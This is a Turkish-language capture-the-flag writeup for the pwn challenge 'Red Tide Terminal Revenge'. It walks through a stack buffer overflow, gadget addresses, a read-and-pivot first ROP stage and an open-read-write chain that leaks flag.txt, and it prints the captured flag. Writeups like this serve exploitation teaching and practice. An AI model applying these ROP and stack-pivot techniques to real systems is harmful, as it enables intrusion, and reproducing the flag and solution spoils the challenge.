# Junior Crypt 2026 CTF — `Red Tide Terminal Revenge` Writeup

- **Yazar:** Efe Sahinbas
- **GitHub Deposu:** [MacallanTheRoot/ctf-writeups](https://github.com/MacallanTheRoot/ctf-writeups/)

**Kategori:** Pwn  
**Hedef:** `red_tide_terminal_revenge`  
**Remote:** `10.112.0.12:42792`  
**Flag formatı:** `grodno{...}`

---

## Soru İçeriği

```text
The abandoned coastal command terminal continues to transmit a signal...

Reach the terminal core and recover the flag.
```

---

## Özet

Bu soru `Red Tide Terminal` challenge'ının daha zor bir varyantıydı. Servis banner'ı şu şekilde değişmişti:

```text
== Red Tide Terminal Revenge ==
Channel restored.
```

Yeni binary bir `Audit note` adımı ekliyor ve packet limitini `0xb0` değerine düşürüyordu. Route fonksiyonu hala return adresi kontrolüne izin veriyordu, fakat ilk aşama ROP zincirinin daha küçük olması gerekiyordu.

Final çözüm küçük bir read-and-pivot aşaması kullandı:

1. Route packet buffer overflow edildi.
2. Saved `rbp`, `stage_area` adresine ayarlandı.
3. Kısa syscall tabanlı `read(0, stage_area, 0x600)` zinciri çalıştırıldı.
4. `leave; ret` ile `stage_area` alanına pivot edildi.
5. Tam ORW zinciri `.bss` üzerinden çalıştırıldı.

Final flag:

```text
grodno{c59a01db-4418-4e87-b718-87687056a019}
```

---

## 1. İlk Binary İncelemesi

Yerel dosya:

```text
red_tide_terminal_revenge
```

Binary standart korumalara sahip 64-bit Linux ELF dosyasıydı:

```text
Full RELRO
Stack Canary
NX enabled
PIE enabled locally
```

Remote süreç yine sabit adresli bir build gibi davranıyordu. Kullanılan remote adresler:

```text
pop rdi; ret  0x4013ec
pop rsi; ret  0x4013f5
pop rdx; ret  0x4013fe
pop rax; ret  0x401407
syscall; ret  0x401410
leave; ret    0x4013e6
stage_area    0x404060
```

---

## 2. Yeni Program Akışı

Servis packet route'a girmeden önce iki metin girdisi istiyordu:

```text
Codename:
Audit note:
Packet length:
Packet data:
```

`Audit note` alanı hala stack-format davranışı gösteriyordu, fakat exploit yolu doğrudan buna bağlı değildi. En kullanışlı primitive yine packet handler'daki overflow oldu.

---

## 3. Route Packet Layout

`route_packet` disassembly'sinde şu yapı görülüyordu:

```asm
sub rsp, 0x60
...
lea rax, [rbp-0x50]
read(0, rax, length)
```

Önemli offsetler:

```text
buffer        rbp - 0x50
saved rbp     offset 0x50
saved rip     offset 0x58
length limit  0xb0
```

Eski exploit doğrudan çalışmadı çünkü ilk aşama ROP zincirinin daha küçük olan `0xb0` limitine sığması gerekiyordu.

---

## 4. Gadget Doğrulaması

Analiz sırasında iki olası gadget seti göründü. Doğrudan `write(1, addr, len)` testi, remote üzerinde çalışan setin shifted adresler olduğunu gösterdi:

```text
pop rdi; ret  0x4013ec
pop rsi; ret  0x4013f5
pop rdx; ret  0x4013fe
pop rax; ret  0x401407
syscall; ret  0x401410
```

Pivot gadget'ı küçük bir ikinci aşama payload'u ile doğrulandı. Bu payload `TEST` yazdırıyordu:

```text
leave; ret = 0x4013e6
```

Başarılı test çıktısı:

```text
Packet queued.
TEST
```

---

## 5. Küçük Birinci Aşama

Final ilk aşama, ROP alanını `pop rbp; ret` için harcamak yerine saved `rbp` slotunu doğrudan kullandı.

Payload yapısı:

```text
"A" * 0x50
p64(stage_area)      # saved rbp
short ROP chain
```

Kısa zincir:

```text
rax = 0
rdi = 0
rsi = stage_area
rdx = 0x600
syscall              # read(0, stage_area, 0x600)
leave; ret
```

`rbp` zaten `stage_area` ile overwrite edildiği için `leave; ret` execution'ı ikinci aşama ROP zincirine taşıdı.

---

## 6. İkinci Aşama: ORW

İkinci aşama `stage_area` içine yazıldı ve `.bss` üzerinden çalıştı.

Yapılan işlemler:

```text
openat(AT_FDCWD, "flag.txt", 0)
read(3, io_area, 0x100)
write(1, io_area, 0x100)
exit(0)
```

`flag.txt` string'i aynı `.bss` payload'unun ilerisine yerleştirildi.

---

## 7. Flag'in Alınması

Pivot düzeltildikten ve ikinci aşama ORW zinciri gönderildikten sonra remote servis şu çıktıyı verdi:

```text
grodno{c59a01db-4418-4e87-b718-87687056a019}
```

---

## 8. Sonuç

Revenge varyantı aynı ana fikri koruyordu, fakat daha küçük bir ilk aşama zorunlu kılıyordu. Kritik değişiklikler:

```text
1. Yeni Codename -> Audit note -> Packet length akışını hesaba kat.
2. Doğru remote gadget setini kullan.
3. 0xb0 packet limitine uy.
4. Saved rbp değerini stage_area yap.
5. leave; ret ile pivot et.
6. Tam ORW zincirini .bss üzerinden çalıştır.
```
